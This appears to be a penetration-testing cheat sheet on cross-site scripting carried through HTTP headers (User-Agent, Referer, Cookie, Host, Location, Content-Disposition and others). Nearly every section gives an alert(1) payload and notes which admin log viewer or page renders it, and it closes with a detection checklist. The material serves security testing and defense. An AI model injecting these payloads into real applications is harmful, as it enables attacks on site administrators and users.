# Header-carried XSS — values in request/response headers

The payload rides in an HTTP header — not a param, not a body
field, but a header the app echoes or the browser renders.

---

## 1. The reflected-header family — your request header echoes

```text
User-Agent: <img src=x onerror=alert(1)>
   → admin log-viewer renders user-agents → stored-blind hybrid

Referer: https://me/?<img src=x onerror=alert(1)>
   → "you came from: ..." pages → reflected

X-Forwarded-For: <img src=x onerror=alert(1)>
   → admin IP-log page → blind

Accept, Accept-Language, Cookie, X-Custom-* headers
   → anywhere the app echoes a header value unsanitized
```

The pattern: headers are "system" data devs sanitize less — but
headers ARE user-controlled. Any header-value that lands in HTML
is an XSS carrier.

`tools/web/http_probe.py --headers` injects arbitrary headers.

---

## 2. The `Cookie:` header — the sneaky one

```text
Cookie: x=<img src=x onerror=alert(1)>
   → a page reading its own cookie into innerHTML → DOM-side XSS
   → or the server logging the raw Cookie header → blind
```

Cookie-header injection needs a cookie-WRITE primitive first
(subdomain cookie-tossing, `document.cookie` write, or an earlier
vuln) — unless the server echoes the raw Cookie request-header.

---

## 3. The response-side headers — server-set values in markup

```text
Location: https://me/<img src=x onerror=alert(1)>
   → a redirect whose URL lands in a link/meta — attribute ctx

Content-Disposition: filename="x"><img src=x onerror=alert(1)>"
   → filename in a download-listing page → filename-XSS
   → the HEADER itself isn't HTML — but the filename lands in a
     download-link's title attr

WWW-Authenticate / Refresh / other response headers
   → browsers don't render headers as markup — dead
```

The Location-header → markup path: a "you'll be redirected to X"
page that renders the Location value — the header lands in the
page.

---

## 4. The `Content-Security-Policy`-header injection

```text
CSP-Report-Only / a CSP you can weaken
   → not directly XSS — but loosening the CSP ENABLES your other
     XSS — see csp.md §15
```

Header injection (CRLF) is a separate vuln class —
`web-request-smuggling` covers CRLF-splitting; the XSS angle is
when the injected header lands in markup.

---

## 5. The `Referer`-header — the chain-of-trust trick

```text
Referer: https://attacker.com/xss-path
   → "linked from:" render → the URL shows in the page
   → if the page renders the referer URL as a link: <a href=REFERER>
   → javascript: inside a referer-derived href → attr-scheme XSS
```

The referer is always https: — `javascript:` can't be a referer —
but a `data:`-referer? browsers don't send data: referers. The
viable path is the referer rendering unescaped in markup, not the
scheme.

---

## 6. The `Host`/`X-Forwarded-Host` — host-header XSS

```text
Host: x"><img src=x onerror=alert(1)>
   → pages that use the Host header for links/canonicals —
     the host lands in <link rel=canonical>, <a href>, og:url
   → web-host-header skill covers the full class
```

Host-header injection → the host value lands in the page's
markup → the host IS the payload carrier.

---

## 7. The JSON-body headers — `Content-Type` echoes

```text
a JSON endpoint echoes the request's Content-Type in an error:
   {"error":"bad type: application/json<img src=x onerror=alert(1)>"}
   → the error renders... in JSON — dead unless the error lands
     in a text/html page
```

The gate: the echo must land in an HTML-parsed response, not the
JSON body.

---

## 8. The `Origin`/`Access-Control-*` headers

```text
Access-Control-Allow-Origin: *
   → not XSS — CORS misconfig — web-cors skill
   → the Origin header ITSELF is a carrier only if echoed in markup
```

CORS headers are a different vuln — only relevant here if the
header value lands in HTML.

---

## 9. The auth-header variants — `Authorization`, `Proxy-Auth`

```text
Authorization: Bearer <img src=x onerror=alert(1)>
   → admin auth-logs render the header → blind
```

The admin-dashboard-renders-headers pattern — the header is the
injection point, the dashboard is the sink.

---

## 10. The detection protocol

```text
1. which headers does the app echo in markup?
   — the classic test: a unique marker in each header, find it
2. which headers does the app LOG for admins?
   — UA, Referer, X-Forwarded-For, Cookie
3. which response-headers land in markup?
   — Location in redirect pages, filename in listings
4. can you write a cookie the page reads?
   — cookie-write primitive needed
```

`http_probe.py --headers 'X-Test: XSS_PROBE_x'` — the probe emits
the verbatim response so you see where the header landed.
